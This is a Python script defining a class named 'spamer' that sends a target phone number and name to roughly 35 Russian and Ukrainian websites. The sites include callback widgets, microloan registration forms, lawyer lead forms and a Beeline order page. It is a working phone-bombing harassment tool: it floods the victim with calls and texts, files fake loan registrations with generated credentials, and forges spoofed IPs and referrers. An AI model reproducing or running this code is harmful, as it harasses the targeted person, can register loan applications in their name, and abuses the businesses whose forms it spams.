import random
import transliterate
import requests
import time
import datetime


class spamer:
    def __init__(self, number: str, name: str, enable_proxy: bool):
        if type(number) == str and type(name) == str and type(enable_proxy) == bool:
            self.date = str(datetime.datetime.today()).split(' ')[0]
            self.randomNames = (
                'Алексей', 'Иван', 'Константин', 'Петр', 'Семен', 'Матвей', 'Станислав', 'Владимир', 'Олег', 'Сергей')
            self.randomSurNames = (
                'Иванов', 'Смирнов', 'Кузнецов', 'Попов', 'Васильев', 'Петров', 'Соколов', 'Михайлов', 'Новиков',
                'Фёдоров',
                'Морозов', 'Волков')
            self.rnadomOtch = (
                'Богданович', 'Маркович', 'Олегович', 'Глебович', 'Александрович', 'Дмитриевич', 'Егорович',
                'Георгиевич',
                'Львович', 'Кириллович')
            self.number = number
            self.name = name
            self.enable_proxy = enable_proxy
            self.countErrors = 0
            self.randomCount = int((random.random() * 10) + 10)
            self.randomTZ = int(random.random() * 10)
            self.randomID = str(random.randint(1, 9)) + str(random.randint(1, 9)) + str(random.randint(1, 9)) + str(
                random.randint(1, 9)) + str(random.randint(1, 9))
            self.problem = 'Здравствуйте, у меня есть проблема'
            self.randomEmail = transliterate.translit(random.choice(self.randomNames),
                                                      reversed=True) + transliterate.translit(
                random.choice(self.randomSurNames), reversed=True) + '@gmail.com'
            self.randomPassword = transliterate.translit(random.choice(self.randomNames),
                                                         reversed=True) + transliterate.translit(
                random.choice(self.randomSurNames), reversed=True)
            self.numberVodaonline = '79852141247'
            self.bPrava = '78005504937'

    def start(self):
        try:
            requests.post('http://smart-lift.com.ua/1.php',
                          data={'txtself.name': self.name, 'txtphone': self.number, 'valTrFal': 'valTrFal_true',
                                'test': ''})
        except:
            self.countErrors += 1

        try:
            requests.post('https://junker.kiev.ua/postmaster.php',
                          data={'self.name': self.name, 'tel': self.number, 'action': 'callme'})
        except:
            self.countErrors += 1

        try:
            requests.post('https://www.big-partner.kh.ua/index.php?route=unishop/request/mail',
                          data={'type': 'Заказ звонка', 'customername': self.name,
                                'customerphoneNum': self.number})

        except:
            self.countErrors += 1

        try:
            requests.post('https://red-caviar.biz.ua/order.php',
                          data={'self.name': self.name, 'phone': self.number, 'meta': '2'})

        except:
            self.countErrors += 1

        try:
            requests.post('https://novogodneepostelnoe.ru/index.php?route=extension/module/callback',
                          data={'self.name': self.name, 'phone': self.number, 'comment': '', 'action': 'send'})

        except:
            self.countErrors += 1

        try:
            requests.post('https://bistrodengi.ru/ajax/lead.php',
                          data={'fio': self.name, 'phone': self.number})

        except:
            self.countErrors += 1

        try:
            requests.post('https://zaymigo.com/register',
                          data={'role': 'borrower', 'registerself.number': self.number,
                                'password': self.randomPassword,
                                'password_confirm': self.randomPassword, 'register_agreements': 1,
                                'register_agreements': 1, 'timezone': self.randomTZ, 'step': 1, 'sum': 10000,
                                'repayment_method': 'once', 'period': 12, 'promoCode': '',
                                'appliedPromoCode': '', 'appliedDiscount': ''})

        except:
            self.countErrors += 1

        try:
            requests.post('https://www.zaim-express.ru/engine/orders2.php',
                          data={'type_amount': 0, 'phone': self.number, 'source': '', 'clickid': '',
                                'webid': '', 'reffer': 'www.google.com', 'site': 'www.zaim-express.ru/'})

        except:
            self.countErrors += 1

        try:
            requests.post('https://xn--80acmlhv0b.xn--80anhm9e.xn--p1ai/gate/public/api/v1/user/phone',
                          data={'phone': self.number})

        except:
            self.countErrors += 1

        try:
            requests.post('https://www.moneza.ru/ws/public/callback-request',
                          data={'clientFullName': self.name, 'phoneNumber': self.number,
                                'timezoneOffsetString': -420})

        except:
            self.countErrors += 1

        try:
            requests.post('https://timezaim.ru/app/',
                          data={'SUMMA': self.randomCount, 'DAY': 90, 'TARIFname': '', 'TARIF': 'main',
                                'SUM': '',
                                'DAYS': '', 'STEP': -1, 'main': 'Y', 'needphoneNum': self.number})

        except:
            self.countErrors += 1

        try:
            requests.post(
                'https://telephony.jivosite.com/api/1/sites/359606/widgets/jbgpFn43Y1/clients/' + str(
                    random.randint(1, 9)) + str(random.randint(1, 9)) + str(random.randint(1, 9)) + str(
                    random.randint(1, 9)) + str(random.randint(1, 9)) + str(
                    random.randint(1, 9)) + '/telephony/callback', data={'phone': self.number, 'invitationproblem': ''})

        except:
            self.countErrors += 1

        try:
            requests.post('https://api.creditter.ru/feedback/phone', json={'phone': self.number})

        except:
            self.countErrors += 1

        try:
            requests.post('https://creditplus.ru/wp-core/wp-admin/admin-ajax.php?action=callbackPhone',
                          data={'number': self.number, 'confirmation_code': '', 'action': 'callbackPhone'})

        except:
            self.countErrors += 1

        try:
            requests.post('https://telephony.jivosite.com/api/1/sites/6235/widgets/zjrL6mQMKT/clients/' + str(
                random.randint(1, 9)) + str(random.randint(1, 9)) + str(random.randint(1, 9)) + str(
                random.randint(1, 9)) + str(random.randint(1, 9)) + '/telephony/callback',
                          data={'phone': self.number, 'invitationproblem': ''})

        except:
            self.countErrors += 1

        try:
            requests.post('https://bukvaprava.ru/wp-admin/admin-ajax.php',
                          data={'text_quest_banner': self.problem, 'self.name': self.name, 'city': 'Москва',
                                'tel': self.number, 'ip': '192.168.1.777',
                                'form_page': 'https://bukvaprava.ru/', 'referer': '',
                                'action': 'ajax-lead'})

        except:
            self.countErrors += 1

        try:
            requests.post('https://www.yurist-online.net/lead_question',
                          data={'region': '27', 'question': self.problem, 'self.name': self.name,
                                'phone': self.number,
                                'email': self.randomEmail.lower(), 'partner_id': '13'})

        except:
            self.countErrors += 1

        try:
            requests.post('http://xn----8sbgev0cabfflr7k.xn--p1ai/scripts/form-u22118.php',
                          data={'custom_U22127': self.numberVodaonline})

        except:
            self.countErrors += 1

        try:
            requests.post('http://s1.nice-cream.ru/phone-widget2/sendRequest.php',
                          data={'phone': '+' + self.number, 'self.name': self.name, 'sid': '*',
                                'gclid': '0',
                                'openstat': 'direct.yandex.ru;12345678;123456789;yandex.ru:premium',
                                'utm': ''})

        except:
            self.countErrors += 1

        try:
            requests.post('https://rossovet.ru/qa/msgsave/save',
                          data={'self.name': self.name, 'comment': self.problem, 'city': 'Москва',
                                'phoneprefix': '(' + self.number + ')', 'phone': self.number,
                                'partnerID': '10',
                                'ref': 'https://yandex.ru/clck/', 'number1': '7', 'number2': '8',
                                'checkcode': '15'})

        except:
            self.countErrors += 1

        try:
            requests.post('https://yuridicheskaya-konsultaciya.com/Home/_FormPost',
                          data={'self.name': self.name, 'Phone': self.number, 'Description': self.problem})

        except:
            self.countErrors += 1

        try:
            requests.post('https://epleads.ru/gate/api.php',
                          data={'question': self.problem, 'region': 'Москва', 'first_lastself.name': self.name,
                                'phone': self.number, 'ofrid': '1', 'wid': '3', 'presetid': '4',
                                'referer': 'https://potreb-prava.com/konsultaciya-yurista/konsultaciya-onlajn-yurista-besplatno-kruglosutochno.html',
                                'ip': '213.154.55.496', 'mobile': '0',
                                'template': 'form_master.new.fix.metrik_lawyer-blue-default',
                                'product': 'lawyer', 'userSoftData': '*'})

        except:
            self.countErrors += 1

        try:
            requests.post('https://pravonedv.ru/proxy_8d34201a5b.php?a___=1',
                          data={'email': self.randomEmail.lower(), 'phone': self.numberVodaonline,
                                'location': 'Москва, Россия', 'self.name': self.name, 'offer': '0',
                                'ip': '263.87.162.98', 'device': 'desktop', 'token': '*',
                                'template': 'two_page3', 'referrer': 'https://yandex.ru/clck/',
                                'domain': 'pravonedv.ru', 'wm_id': '548',
                                'url': 'https://pravonedv.ru/besplatnye-onlajn-konsultacii-yurista'})

        except:
            self.countErrors += 1

        try:
            requests.post(
                'https://xn----etbqwledi5fza.xn--p1ai/wp-json/contact-form-7/v1/contact-forms/295/feedback',
                data={'_wpcf7': '295', '_wpcf7_version': '5.0.5', '_wpcf7_locale': 'ru_RU',
                      '_wpcf7_unit_tag': 'wpcf7-f295-o2', '_wpcf7_container_post': '0', 'text-838': self.name,
                      'tel-231': self.number, 'textarea-472': self.problem, 'hidden-278': 'Главная'})

        except:
            self.countErrors += 1

        try:
            requests.post('http://www.gurist.ru/wp-json/contact-form-7/v1/contact-forms/3591/feedback',
                          data={'_wpcf7': '3591', '_wpcf7_version': '5.0', '_wpcf7_locale': 'ru_RU',
                                '_wpcf7_unit_tag': 'wpcf7-f3591-o1', '_wpcf7_container_post': '0',
                                'your-self.name': self.name, 'tel-147': self.problem})

        except:
            self.countErrors += 1

        try:
            requests.post('https://moskva.beeline.ru/customers/products/mobile/services/createmnporder/',
                          data={'leadName': 'PodborSim', 'phone': self.number, 'region': '98140'})

        except:
            self.countErrors += 1

        try:
            requests.post('https://advokatmakeev.ru/form.php',
                          data={'oname': self.name, 'otel': self.numberVodaonline, 'omail': '',
                                'omess': self.problem, 'otype': '1'})

        except:
            self.countErrors += 1

        try:
            requests.post('http://mkamsk.ru/apply_auto_form',
                          data={'Form[9]': self.name, 'Form[12]': self.number, 'Form[11]': self.problem,
                                'url': 'http://mkamsk.ru/', 'check': 'check'})

        except:
            self.countErrors += 1

        try:
            requests.post('https://usachev.vip/wp-admin/admin-ajax.php',
                          data={'action': 'bazz_widget_action', 'phone': '+' + self.number, 'self.name': ''})

        except:
            self.countErrors += 1

        try:
            requests.post('http://pravo-sfera.ru/auxpage_zayavk/',
                          data={'cname': self.name, 'c_tel': self.numberVodaonline, 'quest': self.problem,
                                'uest_go': 'Задать вопрос'})

        except:
            self.countErrors += 1

        try:
            requests.post('https://urist-expert24.ru/send-lead/',
                          data={'name': self.name, 'phone': self.numberVodaonline,
                                'form-name': 'Заказ обратного звонка'})

        except:
            self.countErrors += 1

        try:
            requests.post('http://law-divorce.ru/wp-admin/admin-ajax.php',
                          data={'ip_address': '', 'ip_country': '', 'ip_region': '', 'ip_city': '',
                                'url': '', 'action': 'lld_send_lead', 'text': self.problem,
                                'self.name': self.name,
                                'telephone': '+' + self.bPrava, 'city': 'Москва'})

        except:
            self.countErrors += 1

        try:
            requests.post('http://www.gos-urist.ru/send.php',
                          {'name': self.name, 'code': self.number, 'phone': self.number,
                           'issue': self.problem})

        except:
            self.countErrors += 1

        try:
            requests.post('http://9911030.ru/orderform.php',
                          {'name': self.name, 'phone': self.number, 'message': self.problem})

        except:
            self.countErrors += 1

        try:
            requests.get('https://findclone.ru/register?phone=' + self.number,
                         params={'phone': self.number})

        except:
            self.countErrors += 1

        print('Errors for calls: ' + str(self.countErrors))
        time.sleep(60)
